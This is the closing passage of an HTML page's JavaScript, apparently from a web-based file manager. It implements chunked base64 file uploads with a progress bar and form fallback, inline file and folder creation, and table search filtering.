            var blob=file.slice(idx*CHUNK,Math.min((idx+1)*CHUNK,file.size));
            var rd=new FileReader();
            rd.onload=function(e){
                var b64=e.target.result.split(',')[1];
                var body=new URLSearchParams();
                body.append('fname',file.name);body.append('chunk',b64);
                body.append('idx',idx);body.append('total',total);body.append('uid',id);
                fetch(ep,{method:'POST',
                    headers:{'Content-Type':'application/x-www-form-urlencoded'},
                    body:body.toString()})
                .then(function(r){return r.json();})
                .then(function(j){
                    if(!j.ok){status('Error: '+j.msg,'err');pw.classList.remove('on');done&&done();return;}
                    idx++;var pct=Math.round(idx/total*100);
                    pf.style.width=pct+'%';pt.textContent=pct+'%';
                    if(idx<total){send();}
                    else{
                        status('Done: '+file.name,'ok');
                        pw.classList.remove('on');
                        setTimeout(function(){location.href='?dir='+encodeURIComponent(dir);},700);
                        done&&done();
                    }
                })
                .catch(function(){
                    status('Retrying via form…','err');
                    fallback(file,done);
                });
            };
            rd.readAsDataURL(blob);
        }
        send();
    }

    function fallback(file,done){
        var f=document.createElement('form');
        f.method='POST';f.enctype='multipart/form-data';
        f.action='?dir='+encodeURIComponent(dir)+'&action=upload';
        var i=document.createElement('input');i.type='file';i.name='file';
        f.appendChild(i);document.body.appendChild(f);
        try{var dt=new DataTransfer();dt.items.add(file);i.files=dt.files;f.submit();}
        catch(e){status('Please retry manually.','err');document.body.removeChild(f);}
    }
})();

// ── inline create ─────────────────────────────────────────────────
function toggleCreate(t){
    var isF=t==='file';
    var wrap=document.getElementById(isF?'wrapFile':'wrapDir');
    var inp =document.getElementById(isF?'inpFile':'inpDir');
    var btn =document.getElementById(isF?'btnFile':'btnDir');
    cancelCreate(isF?'dir':'file');
    wrap.classList.toggle('on');
    if(wrap.classList.contains('on')){btn.style.display='none';inp.value='';inp.focus();}
}
function cancelCreate(t){
    var isF=t==='file';
    var w=document.getElementById(isF?'wrapFile':'wrapDir');
    var b=document.getElementById(isF?'btnFile':'btnDir');
    if(w)w.classList.remove('on');if(b)b.style.display='';
}
function ckCreate(e,inp){
    if(e.key==='Enter'){
        e.preventDefault();
        if(inp.value.trim()===''){inp.focus();return;}
        inp.closest('form').submit();
    }
    if(e.key==='Escape')cancelCreate(inp.id==='inpFile'?'file':'dir');
}

// ── search ────────────────────────────────────────────────────────
function filterTable(q){
    q=q.toLowerCase();
    var rows=document.querySelectorAll('#fileBody tr');
    rows.forEach(function(r){
        if(r.classList.contains('parent-row')){r.style.display='';return;}
        r.style.display=r.textContent.toLowerCase().indexOf(q)>-1?'':'none';
    });
}
</script>

</body>
</html>
